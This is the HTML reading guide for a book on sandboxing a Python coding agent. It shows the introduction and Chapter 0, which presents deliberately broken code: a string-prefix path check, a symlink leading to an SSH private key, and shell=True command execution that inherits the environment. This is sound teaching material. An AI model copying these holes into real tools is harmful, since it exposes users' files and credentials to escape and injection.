@@ -1,0 +1,3050 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Build a Mini Python Sandbox</title>
+<link rel="stylesheet" href="assets/explainer.css">
+<script>
+(function () {
+  try {
+    var saved = JSON.parse(localStorage.getItem('mca-site-customiser:v2')) || {};
+    var mode = saved.mode === 'light' || saved.mode === 'dark' ? saved.mode : 'auto';
+    var dark = mode === 'dark' || (mode === 'auto' && window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches);
+    document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+  } catch (e) { /* no stored preference */ }
+})();
+</script>
+</head>
+<body>
+<div class="progress"><span id="bar"></span></div>
+<div class="shell">
+
+  <aside class="sidebar">
+    <a class="side-kicker" href="#top">Mini Python Sandbox · reading guide</a>
+    <p class="side-title">Build a Mini Python Sandbox</p>
+    <p class="side-sub">The path policy, the command runner, the container, the audit trail.</p>
+    <div class="side-rule"></div>
+    <p class="side-label">Contents</p>
+    <nav class="toc" id="toc">
+      <a href="#s01" class="l2"><span class="n">01</span><span>Introduction</span></a>
+      <a href="#s01-01" class="l3"><span class="n"></span><span>What the book builds</span></a>
+      <a href="#s01-02" class="l3"><span class="n"></span><span>Quick start</span></a>
+      <a href="#s01-03" class="l3"><span class="n"></span><span>Rebuild the book artifacts</span></a>
+      <a href="#s01-04" class="l3"><span class="n"></span><span>Repository map</span></a>
+      <a href="#s01-05" class="l3"><span class="n"></span><span>Design rules used throughout</span></a>
+      <a href="#s01-06" class="l3"><span class="n"></span><span>Test map</span></a>
+      <a href="#s01-07" class="l3"><span class="n"></span><span>Platform notes</span></a>
+      <a href="#s01-08" class="l3"><span class="n"></span><span>Where to start reading</span></a>
+      <a href="#s02" class="l2"><span class="n">02</span><span>Chapter 0 — Stage 0: The naive fence</span></a>
+      <a href="#s02-01" class="l3"><span class="n"></span><span>The shape we are building</span></a>
+      <a href="#s02-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s02-03" class="l3"><span class="n"></span><span>The three holes</span></a>
+      <a href="#s02-03-01" class="l4"><span class="n"></span><span>1. A prefix check is not a containment check</span></a>
+      <a href="#s02-03-02" class="l4"><span class="n"></span><span>2. A symlink is inside the workspace by name and outside by target</span></a>
+      <a href="#s02-03-03" class="l4"><span class="n"></span><span>3. A shell is not a command runner</span></a>
+      <a href="#s02-04" class="l3"><span class="n"></span><span>Run it</span></a>
+      <a href="#s02-05" class="l3"><span class="n"></span><span>It works when</span></a>
+      <a href="#s02-06" class="l3"><span class="n"></span><span>Why keep the broken code?</span></a>
+      <a href="#s02-07" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s02-08" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s02-09" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s03" class="l2"><span class="n">03</span><span>Chapter 1 — Stage 1: One path policy</span></a>
+      <a href="#s03-01" class="l3"><span class="n"></span><span>The problem</span></a>
+      <a href="#s03-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s03-03" class="l3"><span class="n"></span><span>The central algorithm</span></a>
+      <a href="#s03-03-01" class="l4"><span class="n"></span><span>Resolve the deepest existing ancestor</span></a>
+      <a href="#s03-03-02" class="l4"><span class="n"></span><span>Compare real paths with commonpath</span></a>
+      <a href="#s03-03-03" class="l4"><span class="n"></span><span>Reads and writes differ on purpose</span></a>
+      <a href="#s03-03-04" class="l4"><span class="n"></span><span>Platform spellings are normalised before validation</span></a>
+      <a href="#s03-04" class="l3"><span class="n"></span><span>Run it</span></a>
+      <a href="#s03-05" class="l3"><span class="n"></span><span>It works when</span></a>
+      <a href="#s03-06" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s03-07" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s03-08" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s04" class="l2"><span class="n">04</span><span>Chapter 2 — Stage 2: The sandbox object and file tools</span></a>
+      <a href="#s04-01" class="l3"><span class="n"></span><span>The problem</span></a>
+      <a href="#s04-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s04-03" class="l3"><span class="n"></span><span>The contract</span></a>
+      <a href="#s04-03-01" class="l4"><span class="n"></span><span>Limits</span></a>
+      <a href="#s04-03-02" class="l4"><span class="n"></span><span>Reads are byte-bounded</span></a>
+      <a href="#s04-03-03" class="l4"><span class="n"></span><span>Writes are atomic</span></a>
+      <a href="#s04-03-04" class="l4"><span class="n"></span><span>Edits are unique by default</span></a>
+      <a href="#s04-03-05" class="l4"><span class="n"></span><span>Deletes are file-only</span></a>
+      <a href="#s04-03-06" class="l4"><span class="n"></span><span>Errors become observations</span></a>
+      <a href="#s04-04" class="l3"><span class="n"></span><span>Run it</span></a>
+      <a href="#s04-05" class="l3"><span class="n"></span><span>It works when</span></a>
+      <a href="#s04-06" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s04-07" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s04-08" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s05" class="l2"><span class="n">05</span><span>Chapter 3 — Stage 3: Running code locally</span></a>
+      <a href="#s05-01" class="l3"><span class="n"></span><span>The problem</span></a>
+      <a href="#s05-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s05-03" class="l3"><span class="n"></span><span>The seven controls</span></a>
+      <a href="#s05-03-01" class="l4"><span class="n"></span><span>1. Argv, not a string</span></a>
+      <a href="#s05-03-02" class="l4"><span class="n"></span><span>2. An absolute-path allowlist</span></a>
+      <a href="#s05-03-03" class="l4"><span class="n"></span><span>3. A clean environment</span></a>
+      <a href="#s05-03-04" class="l4"><span class="n"></span><span>4. A timeout with a process-tree kill</span></a>
+      <a href="#s05-03-05" class="l4"><span class="n"></span><span>5. Output caps that still drain</span></a>
+      <a href="#s05-03-06" class="l4"><span class="n"></span><span>6. POSIX resource limits</span></a>
+      <a href="#s05-03-07" class="l4"><span class="n"></span><span>7. A workspace-relative working directory</span></a>
+      <a href="#s05-04" class="l3"><span class="n"></span><span>What the demo proves, honestly</span></a>
+      <a href="#s05-05" class="l3"><span class="n"></span><span>Run it</span></a>
+      <a href="#s05-06" class="l3"><span class="n"></span><span>It works when</span></a>
+      <a href="#s05-07" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s05-08" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s05-09" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s06" class="l2"><span class="n">06</span><span>Chapter 4 — Stage 4: Docker as the real wall</span></a>
+      <a href="#s06-01" class="l3"><span class="n"></span><span>The problem</span></a>
+      <a href="#s06-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s06-03" class="l3"><span class="n"></span><span>The image contract</span></a>
+      <a href="#s06-04" class="l3"><span class="n"></span><span>The run contract</span></a>
+      <a href="#s06-05" class="l3"><span class="n"></span><span>The important subtlety: read-only root is not read-only workspace</span></a>
+      <a href="#s06-06" class="l3"><span class="n"></span><span>Timeout cleanup</span></a>
+      <a href="#s06-07" class="l3"><span class="n"></span><span>Run it</span></a>
+      <a href="#s06-08" class="l3"><span class="n"></span><span>It works when</span></a>
+      <a href="#s06-09" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s06-10" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s06-11" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s07" class="l2"><span class="n">07</span><span>Chapter 5 — Stage 5: The finished harness</span></a>
+      <a href="#s07-01" class="l3"><span class="n"></span><span>The problem</span></a>
+      <a href="#s07-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s07-03" class="l3"><span class="n"></span><span>The toolbox</span></a>
+      <a href="#s07-04" class="l3"><span class="n"></span><span>The loop</span></a>
+      <a href="#s07-05" class="l3"><span class="n"></span><span>The audit log</span></a>
+      <a href="#s07-06" class="l3"><span class="n"></span><span>The scripted demo</span></a>
+      <a href="#s07-07" class="l3"><span class="n"></span><span>End-to-end acceptance</span></a>
+      <a href="#s07-08" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s07-09" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s07-10" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s08" class="l2"><span class="n">08</span><span>Threat model</span></a>
+      <a href="#s08-01" class="l3"><span class="n"></span><span>1. Assets</span></a>
+      <a href="#s08-02" class="l3"><span class="n"></span><span>2. Actors and assumptions</span></a>
+      <a href="#s08-03" class="l3"><span class="n"></span><span>3. Trust boundaries</span></a>
+      <a href="#s08-04" class="l3"><span class="n"></span><span>4. Threats and controls</span></a>
+      <a href="#s08-04-01" class="l4"><span class="n"></span><span>T1 — Path traversal</span></a>
+      <a href="#s08-04-02" class="l4"><span class="n"></span><span>T2 — Prefix-sibling escape</span></a>
+      <a href="#s08-04-03" class="l4"><span class="n"></span><span>T3 — Symlink escape</span></a>
+      <a href="#s08-04-04" class="l4"><span class="n"></span><span>T4 — Windows-specific path confusion</span></a>
+      <a href="#s08-04-05" class="l4"><span class="n"></span><span>T5 — Shell injection</span></a>
+      <a href="#s08-04-06" class="l4"><span class="n"></span><span>T6 — Environment leakage</span></a>
+      <a href="#s08-04-07" class="l4"><span class="n"></span><span>T7 — Resource exhaustion</span></a>
+      <a href="#s08-04-08" class="l4"><span class="n"></span><span>T8 — Network access and exfiltration</span></a>
+      <a href="#s08-04-09" class="l4"><span class="n"></span><span>T9 — Container escape / privilege escalation</span></a>
+      <a href="#s08-04-10" class="l4"><span class="n"></span><span>T10 — Image supply chain</span></a>
+      <a href="#s08-04-11" class="l4"><span class="n"></span><span>T11 — Audit tampering</span></a>
+      <a href="#s08-04-12" class="l4"><span class="n"></span><span>T12 — Prompt injection through tool output</span></a>
+      <a href="#s08-04-13" class="l4"><span class="n"></span><span>T13 — Denial of service against the agent loop</span></a>
+      <a href="#s08-05" class="l3"><span class="n"></span><span>5. Controls by stage</span></a>
+      <a href="#s08-06" class="l3"><span class="n"></span><span>6. Residual risk statement</span></a>
+      <a href="#s08-07" class="l3"><span class="n"></span><span>7. Review checklist</span></a>
+      <a href="#s09" class="l2"><span class="n">09</span><span>Operations runbook</span></a>
+      <a href="#s09-01" class="l3"><span class="n"></span><span>1. Prerequisites</span></a>
+      <a href="#s09-02" class="l3"><span class="n"></span><span>2. Install and verify</span></a>
+      <a href="#s09-03" class="l3"><span class="n"></span><span>3. Configuration</span></a>
+      <a href="#s09-04" class="l3"><span class="n"></span><span>4. Docker daemon security</span></a>
+      <a href="#s09-05" class="l3"><span class="n"></span><span>5. Image lifecycle</span></a>
+      <a href="#s09-06" class="l3"><span class="n"></span><span>6. Audit lifecycle</span></a>
+      <a href="#s09-06-01" class="l4"><span class="n"></span><span>Audit verification</span></a>
+      <a href="#s09-07" class="l3"><span class="n"></span><span>7. Monitoring and alerts</span></a>
+      <a href="#s09-08" class="l3"><span class="n"></span><span>8. Incident response</span></a>
+      <a href="#s09-08-01" class="l4"><span class="n"></span><span>Suspected sandbox escape or host compromise</span></a>
+      <a href="#s09-08-02" class="l4"><span class="n"></span><span>Audit chain failure</span></a>
+      <a href="#s09-08-03" class="l4"><span class="n"></span><span>Runaway container</span></a>
+      <a href="#s09-09" class="l3"><span class="n"></span><span>9. Kill switch</span></a>
+      <a href="#s09-10" class="l3"><span class="n"></span><span>10. Windows and macOS notes</span></a>
+      <a href="#s09-11" class="l3"><span class="n"></span><span>11. Capacity planning</span></a>
+      <a href="#s09-12" class="l3"><span class="n"></span><span>12. Change control checklist</span></a>
+      <a href="#s10" class="l2"><span class="n">10</span><span>Plan — the stage contract</span></a>
+      <a href="#s10-01" class="l3"><span class="n"></span><span>Global rules</span></a>
+      <a href="#s10-02" class="l3"><span class="n"></span><span>Stage 0 — The naive fence</span></a>
+      <a href="#s10-03" class="l3"><span class="n"></span><span>Stage 1 — One path policy</span></a>
+      <a href="#s10-04" class="l3"><span class="n"></span><span>Stage 2 — The sandbox and file tools</span></a>
+      <a href="#s10-05" class="l3"><span class="n"></span><span>Stage 3 — Running code locally</span></a>
+      <a href="#s10-06" class="l3"><span class="n"></span><span>Stage 4 — Docker as the real wall</span></a>
+      <a href="#s10-07" class="l3"><span class="n"></span><span>Stage 5 — The finished harness</span></a>
+      <a href="#s10-08" class="l3"><span class="n"></span><span>Stage boundaries and non-goals</span></a>
+      <a href="#s10-09" class="l3"><span class="n"></span><span>Definition of done for the whole book</span></a>
+      <a href="#s11" class="l2"><span class="n">11</span><span>Function reference</span></a>
+      <a href="#s11-01" class="l3"><span class="n"></span><span>Where to start</span></a>
+      <a href="#s11-02" class="l3"><span class="n"></span><span>File map</span></a>
+      <a href="#s11-02-01" class="l4"><span class="n"></span><span>ch00/mini_harness/unsafe.py</span></a>
+      <a href="#s11-02-02" class="l4"><span class="n"></span><span>ch01/mini_harness/path_policy.py</span></a>
+      <a href="#s11-02-03" class="l4"><span class="n"></span><span>ch02/mini_harness/sandbox.py</span></a>
+      <a href="#s11-02-04" class="l4"><span class="n"></span><span>ch02/mini_harness/file_tools.py</span></a>
+      <a href="#s11-02-05" class="l4"><span class="n"></span><span>ch03/mini_harness/local_runner.py</span></a>
+      <a href="#s11-02-06" class="l4"><span class="n"></span><span>ch03/mini_harness/command_tool.py</span></a>
+      <a href="#s11-02-07" class="l4"><span class="n"></span><span>ch04/mini_harness/docker_runner.py</span></a>
+      <a href="#s11-02-08" class="l4"><span class="n"></span><span>ch05/mini_harness/toolbox.py</span></a>
+      <a href="#s11-02-09" class="l4"><span class="n"></span><span>ch05/mini_harness/docker_tools.py</span></a>
+      <a href="#s11-02-10" class="l4"><span class="n"></span><span>ch05/mini_harness/audit.py</span></a>
+      <a href="#s11-02-11" class="l4"><span class="n"></span><span>ch05/mini_harness/agent.py</span></a>
+      <a href="#s11-02-12" class="l4"><span class="n"></span><span>ch05/mini_harness/cli.py</span></a>
+      <a href="#s11-02-13" class="l4"><span class="n"></span><span>ch00–ch05 demos</span></a>
+      <a href="#s11-03" class="l3"><span class="n"></span><span>Alphabetical index</span></a>
+      <a href="#s11-04" class="l3"><span class="n"></span><span>Observation vocabulary</span></a>
+      <a href="#s11-05" class="l3"><span class="n"></span><span>Constants worth knowing</span></a>
+    </nav>
+    <div class="side-foot">
+      Built from book_html.md<br>Six stages and four appendices
+    </div>
+  </aside>
+
+  <main class="pane" id="top">
+    <div class="inner">
+      <header class="page-heading">
+        <p class="eyebrow">Mini Python Sandbox · six stages</p>
+        <h1>Build a Mini Python Sandbox</h1>
+        <p class="lede">A short, runnable book about turning model tool calls into bounded, auditable operating-system actions.</p>
+        <p class="meta">
+          <span>6 chapters</span>
+          <span>4 appendices</span>
+          <span>Python 3.11+</span>
+          <span>pytest</span>
+        </p>
+      </header>
+
+
+<section id="s01">
+<h2><span class="num">01</span><span>Introduction</span></h2>
+
+<p>Companion code for a short, hands-on book about sandboxing a small **Python</p>
+
+<p>coding agent** — from a deliberately broken string-prefix fence to a hardened</p>
+
+<p>Docker container with a hash-chained audit log.</p>
+
+<p>The book is the six <code>chNN/CHAPTER.md</code> files. This repository is the runnable</p>
+
+<p>version: every stage is a standalone Python project, every module is commented,</p>
+
+<p>and every security claim has a test beside it.</p>
+
+<div class="callout"><p><strong>Safety note.</strong> Stage 0 is intentionally unsafe. It exists to demonstrate three concrete holes, and its demo only runs against a temporary directory. Do not point <code>unsafe.py</code> at your home folder, do not add <code>--privileged</code> to the Docker recipe, and never mount the Docker socket into the sandbox.</p></div>
+
+<h3 id="s01-01">What the book builds</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Stage</th><th>Chapter</th><th>The boundary added</th></tr>
+<tr><td>0</td><td>The naive fence</td><td>A string prefix check and a shell call — and proof of why they fail</td></tr>
+<tr><td>1</td><td>One path policy</td><td>Canonical paths, symlink resolution, platform rules</td></tr>
+<tr><td>2</td><td>The sandbox and file tools</td><td>Size limits, atomic writes, safe edits, observations</td></tr>
+<tr><td>3</td><td>Running code locally</td><td>Argv allowlist, clean env, timeout, tree kill, output caps, rlimits</td></tr>
+<tr><td>4</td><td>Docker as the real wall</td><td>Network none, read-only root, capabilities dropped, resource limits</td></tr>
+<tr><td>5</td><td>The finished harness</td><td>Tool routing, ReAct loop, audit chain, offline demo</td></tr>
+</table></div>
+
+<p>A coding agent is a loop that turns model text into operating-system actions.</p>
+
+<p>The book focuses on that conversion point: **what a tool is allowed to do, how</p>
+
+<p>much it may consume, and what the model sees when it is refused.**</p>
+
+<h3 id="s01-02">Quick start</h3>
+
+<p>Each chapter runs from its own directory. The runtime code has no third-party</p>
+
+<p>dependencies; pytest is the only test dependency. Install it once with</p>
+
+<p><code>python -m pip install pytest</code> (or use your own environment manager). No API</p>
+
+<p>key is required. Python 3.11 or newer is recommended.</p>
+
+<figure class="code"><pre>cd ch00
+python -m mini_harness.demo
+python -m pytest -v</pre></figure>
+
+<p>The finished harness:</p>
+
+<figure class="code"><pre>cd ch05
+python -m mini_harness                 # offline demo, Docker optional
+python -m mini_harness --build         # build the sandbox image first
+python -m pytest -v</pre></figure>
+
+<p>With Docker installed and the image built:</p>
+
+<figure class="code"><pre>cd ch04
+docker build -t mini-harness-python:latest docker
+python -m mini_harness.demo</pre></figure>
+
+<p>Docker integration tests skip cleanly when the daemon or image is missing. The</p>
+
+<p>offline tests never need Docker.</p>
+
+<h3 id="s01-03">Rebuild the book artifacts</h3>
+
+<p>The chapters and manuals are the editable sources. <code>scripts/build_book.py</code></p>
+
+<p>concatenates them into two generated Markdown variants: <code>book.md</code> for the PDF</p>
+
+<p>(one title, <code>##</code> chapters) and <code>book_html.md</code> for the sidebar reading guide</p>
+
+<p>(one <code>#</code> per chapter).</p>
+
+<figure class="code"><pre>python scripts/build_book.py</pre></figure>
+
+<p>PDF export (needs <code>markdown</code> and <code>pypdf</code>; Chrome or Edge is detected</p>
+
+<p>automatically):</p>
+
+<figure class="code"><pre>python skills/make-pdf-from-md/scripts/make_pdf.py book.md book.pdf --title "Build a Mini Python Sandbox" --keep-html build/book.html</pre></figure>
+
+<p>HTML reading guide (needs Node.js; the local converter is in the skill):</p>
+
+<figure class="code"><pre>python scripts/build_book_html.py</pre></figure>
+
+<p><code>book.pdf</code> and <code>book.html</code> are the two reader-facing artifacts; <code>book.md</code> and</p>
+
+<p><code>book_html.md</code> are generated intermediate sources.</p>
+
+<h3 id="s01-04">Repository map</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Path</th><th>What it is</th></tr>
+<tr><td><code>ch00/</code> … <code>ch05/</code></td><td>One standalone, runnable stage per chapter</td></tr>
+<tr><td><code>chNN/CHAPTER.md</code></td><td>The chapter: problem, design, walkthrough, acceptance, limits</td></tr>
+<tr><td><code>chNN/mini_harness/</code></td><td>The stage's Python package</td></tr>
+<tr><td><code>chNN/tests/</code></td><td>unittest-style tests, collected by <code>pytest</code></td></tr>
+<tr><td><code>chNN/workspace/</code></td><td>A small sample workspace for experimenting</td></tr>
+<tr><td><code>ch04/docker/</code>, <code>ch05/docker/</code></td><td>The sandbox image</td></tr>
+<tr><td><code>plan.md</code></td><td>The stage-by-stage build contract</td></tr>
+<tr><td><code>function_reference.md</code></td><td>Alphabetical and file-by-file code map</td></tr>
+<tr><td><code>THREAT_MODEL.md</code></td><td>Assets, adversaries, threats, mitigations and residual risk</td></tr>
+<tr><td><code>OPERATIONS.md</code></td><td>Build, run, update, audit and incident-response runbook</td></tr>
+<tr><td><code>qa.html</code></td><td>Architecture Q&amp;A companion built with the shared explainer standard; open it in a browser</td></tr>
+<tr><td><code>book.md</code>, <code>book.pdf</code></td><td>Generated combined manuscript and print-ready PDF</td></tr>
+<tr><td><code>book_html.md</code>, <code>book.html</code></td><td>Generated HTML source and sidebar reading guide</td></tr>
+<tr><td><code>scripts/build_book.py</code>, <code>scripts/build_book_html.py</code></td><td>Rebuild the combined sources and the HTML reading guide</td></tr>
+<tr><td><code>scripts/md-to-html.mjs</code></td><td>Canonical Markdown → styled explainer converter</td></tr>
+<tr><td><code>assets/explainer.css</code>, <code>assets/explainer.js</code></td><td>The one stylesheet and behaviour shared by every explainer</td></tr>
+<tr><td><code>templates/explainer.html</code></td><td>Starter page for a hand-built explainer</td></tr>
+<tr><td><code>EXPLAINERS.md</code></td><td>The HTML explainer standard (layout, components, checklist)</td></tr>
+<tr><td><code>skills/</code></td><td>Local PDF/HTML generation skills and scripts</td></tr>
+<tr><td><code>EXPLAINERS.md</code></td><td>Shared HTML explainer standard</td></tr>
+<tr><td><code>assets/</code>, <code>templates/</code></td><td>Shared explainer CSS/JS and starter page</td></tr>
+</table></div>
+
+<h3 id="s01-05">Design rules used throughout</h3>
+
+<ol>
+<li><strong>One policy per boundary.</strong> File paths go through one <code>PathPolicy</code>. Container</li>
+</ol>
+
+<p>   flags go through one <code>DockerRunner</code>. A tool does not invent a second check.</p>
+
+<ol>
+<li><strong>Refusals are observations.</strong> A tool returns <code>ERROR[PATH]: ...</code>, not a</li>
+</ol>
+
+<p>   traceback. The loop continues; the model can choose another action.</p>
+
+<ol>
+<li><strong>No shell for model input.</strong> Commands are argv lists. A semicolon is an</li>
+</ol>
+
+<p>   argument, not a second command.</p>
+
+<ol>
+<li><strong>The environment is built, not inherited.</strong> A child process sees the</li>
+</ol>
+
+<p>   variables the OS needs and nothing else.</p>
+
+<ol>
+<li><strong>Limits are explicit.</strong> Byte caps, entry caps, timeouts, memory, pids and</li>
+</ol>
+
+<p>   step counts each have a named default and a test.</p>
+
+<ol>
+<li><strong>Defence in depth.</strong> The path policy protects the file tools; the container</li>
+</ol>
+
+<p>   protects everything that escapes Python.</p>
+
+<ol>
+<li><strong>The audit is outside the workspace.</strong> Tools cannot edit their own trail</li>
+</ol>
+
+<p>   through the sandbox, and the hash chain makes edits visible.</p>
+
+<ol>
+<li><strong>The step limit is in the loop.</strong> A model may loop forever; the harness may</li>
+</ol>
+
+<p>   not.</p>
+
+<h3 id="s01-06">Test map</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Chapter</th><th>Command</th><th>Docker needed</th><th>Notes</th></tr>
+<tr><td><code>ch00</code></td><td><code>python -m pytest -v</code></td><td>No</td><td>Asserts the three unsafe outcomes</td></tr>
+<tr><td><code>ch01</code></td><td>same</td><td>No</td><td>Symlink tests skip if the OS refuses links</td></tr>
+<tr><td><code>ch02</code></td><td>same</td><td>No</td><td>Atomic writes, limits, error strings</td></tr>
+<tr><td><code>ch03</code></td><td>same</td><td>No</td><td>Uses the running Python as the only allowlisted program</td></tr>
+<tr><td><code>ch04</code></td><td>same</td><td>Optional</td><td>Offline tests inspect every <code>docker run</code> flag; integration skips</td></tr>
+<tr><td><code>ch05</code></td><td>same</td><td>Optional</td><td>Audit chain, agent loop, CLI demo; Docker step skips</td></tr>
+</table></div>
+
+<p>Run all chapters from the repository root:</p>
+
+<figure class="code"><pre>for chapter in ch00 ch01 ch02 ch03 ch04 ch05; do
+  echo "== $chapter =="
+  (cd "$chapter" &amp;&amp; python -m pytest -v)
+done</pre></figure>
+
+<p>On Windows PowerShell:</p>
+
+<figure class="code"><pre>foreach ($chapter in "ch00","ch01","ch02","ch03","ch04","ch05") {
+  Write-Host "== $chapter =="
+  Push-Location $chapter
+  python -m pytest -v
+  Pop-Location
+}</pre></figure>
+
+<h3 id="s01-07">Platform notes</h3>
+
+<ul>
+<li><strong>Windows.</strong> Creating symlinks needs Developer Mode or an elevated process;</li>
+</ul>
+
+<p>  the path-policy symlink tests skip when the OS refuses. POSIX <code>RLIMIT_*</code></p>
+
+<p>  tests also skip. The Docker chapters use Linux containers through Docker</p>
+
+<p>  Desktop.</p>
+
+<ul>
+<li><strong>macOS / Linux.</strong> Symlink and rlimit tests run. Docker Desktop or Docker</li>
+</ul>
+
+<p>  Engine is needed only for the integration tests.</p>
+
+<ul>
+<li><strong>No Docker?</strong> The book still teaches the whole path from Stage 0 to Stage 3,</li>
+</ul>
+
+<p>  and Stage 4's offline tests validate the exact container recipe.</p>
+
+<h3 id="s01-08">Where to start reading</h3>
+
+<p>Read <code>THREAT_MODEL.md</code> first if you want the “why”. Read <code>plan.md</code> if you want</p>
+
+<p>the contract. Read <code>function_reference.md</code> when you are tracing a function.</p>
+
+<p>Open <code>qa.html</code> when you want the short answer to an architecture question. Every</p>
+
+<p>HTML explainer follows <code>EXPLAINERS.md</code>; generate a new one from Markdown with</p>
+
+<p><code>node scripts/md-to-html.mjs &lt;input.md&gt;</code>.</p>
+
+<p>Then start at <code>ch00/CHAPTER.md</code> and run each stage in order. The code is</p>
+
+<p>cumulative in shape but each chapter is standalone on disk, so you can jump to</p>
+
+<p>the boundary you care about.</p>
+
+</section>
+
+<hr>
+
+<section id="s02">
+<h2><span class="num">02</span><span>Chapter 0 — Stage 0: The naive fence</span></h2>
+
+<p><strong>Book:</strong> Stage 0, "The naive fence"</p>
+
+<p><strong>Plan:</strong> Stage 0</p>
+
+<p><strong>Goal:</strong> Build the smallest possible tool surface, then prove that its sandbox is not a sandbox.</p>
+
+<h3 id="s02-01">The shape we are building</h3>
+
+<p>A coding agent is a loop:</p>
+
+<figure class="code"><pre>user task -&gt; model -&gt; tool call -&gt; observation -&gt; model -&gt; ... -&gt; final answer</pre></figure>
+
+<p>The interesting part for this book is the arrow between <strong>tool call</strong> and</p>
+
+<p><strong>observation</strong>. A tool is where model text becomes an operating-system action:</p>
+
+<p>a file read, a file write, a process start. Everything else is conversation.</p>
+
+<p>Sandboxing is the set of decisions that controls that arrow.</p>
+
+<p>Stage 0 deliberately makes the wrong decisions, because they are the ones a</p>
+
+<p>first prototype usually makes:</p>
+
+<ul>
+<li>join the requested path to a workspace root;</li>
+<li>check that the result starts with the root as a <strong>string</strong>;</li>
+<li>run commands through the platform shell;</li>
+<li>inherit the parent environment;</li>
+<li>trust the model not to ask for anything strange.</li>
+</ul>
+
+<p>Each of those choices looks reasonable in a demo. Each has a concrete failure.</p>
+
+<h3 id="s02-02">What changed</h3>
+
+<ul>
+<li>Added <code>mini_harness/unsafe.py</code> with <code>read_file</code>, <code>list_files</code> and <code>run_shell</code>.</li>
+<li>Added <code>mini_harness/demo.py</code>, which builds a throwaway lab and shows the holes.</li>
+<li>Added <code>tests/test_unsafe.py</code>, which <strong>asserts the bad outcomes</strong> so the</li>
+</ul>
+
+<p>  threat model is executable.</p>
+
+<h3 id="s02-03">The three holes</h3>
+
+<h4 id="s02-03-01">1. A prefix check is not a containment check</h4>
+
+<figure class="code"><pre>target = os.path.abspath(os.path.join(root, relative))
+if target.startswith(root):
+    return Path(target).read_text()</pre></figure>
+
+<p><code>/tmp/workspace-evil</code> starts with <code>/tmp/workspace</code>. A sibling folder therefore</p>
+
+<p>passes the fence. The check compares spellings, not filesystem identities.</p>
+
+<h4 id="s02-03-02">2. A symlink is inside the workspace by name and outside by target</h4>
+
+<figure class="code"><pre>workspace/innocent-link.txt -&gt; /home/me/.ssh/id_ed25519</pre></figure>
+
+<p>The string <code>workspace/innocent-link.txt</code> starts with <code>workspace</code>, so the check</p>
+
+<p>passes. The kernel follows the link and opens the key. <code>os.path.abspath</code> does</p>
+
+<p>not resolve symlinks; it only collapses <code>.</code> and <code>..</code>.</p>
+
+<h4 id="s02-03-03">3. A shell is not a command runner</h4>
+
+<figure class="code"><pre>subprocess.run(command, shell=True, cwd=root)</pre></figure>
+
+<p>This gives one tool call the power to become many commands. It also inherits</p>
+
+<p>every secret in the parent environment, has no wall-clock limit, captures</p>
+
+<p>unbounded output in memory, and applies no CPU, memory or file-size limit.</p>
+
+<p>The tests keep the shell command harmless (<code>echo hello</code>). The point is the</p>
+
+<p>shape of the call, not a destructive example. Never point Stage 0 at a real</p>
+
+<p>home directory.</p>
+
+<h3 id="s02-04">Run it</h3>
+
+<p>From <code>ch00/</code>:</p>
+
+<figure class="code"><pre>python -m mini_harness.demo
+python -m pytest -v</pre></figure>
+
+<p>The demo uses <code>tempfile.TemporaryDirectory</code>. On Windows without Developer Mode,</p>
+
+<p>creating a symlink is refused by the OS; the demo prints a skip line and still</p>
+
+<p>shows the prefix-sibling escape.</p>
+
+<p>Expected shape:</p>
+
+<figure class="code"><pre>[leaked ] prefix sibling: sibling secret\n
+[blocked] plain ../ traversal: ValueError: path escapes workspace: ../outside-secret.txt</pre></figure>
+
+<h3 id="s02-05">It works when</h3>
+
+<ul>
+<li>[ ] <code>python -m mini_harness.demo</code> exits zero.</li>
+<li>[ ] The prefix-sibling read is reported as <code>[leaked]</code>.</li>
+<li>[ ] Plain <code>../</code> traversal is reported as <code>[blocked]</code>.</li>
+<li>[ ] On a symlink-capable machine, the symlink read is reported as <code>[leaked]</code>.</li>
+<li>[ ] <code>python -m pytest -v</code> passes (symlink test may skip).</li>
+<li>[ ] You can explain why the symlink case is invisible to <code>startswith</code>.</li>
+</ul>
+
+<h3 id="s02-06">Why keep the broken code?</h3>
+
+<p>Because "we will add security later" is easier to resist when the first version</p>
+
+<p>comes with a failing threat model. The tests are not celebrating the holes; they</p>
+
+<p>are pinning them down. Chapter 1 replaces the expectations with the opposite</p>
+
+<p>ones: the escape must be refused.</p>
+
+<p>A second reason is pedagogical: the fixed version is easier to trust when you</p>
+
+<p>have seen the exact input that broke the naive version.</p>
+
+<h3 id="s02-07">Stage limits</h3>
+
+<ul>
+<li>No real path policy.</li>
+<li>No size limits.</li>
+<li>No command allowlist, timeout or output cap.</li>
+<li>No audit trail.</li>
+<li>The demo is intentionally unsafe; do not reuse <code>unsafe.py</code>.</li>
+</ul>
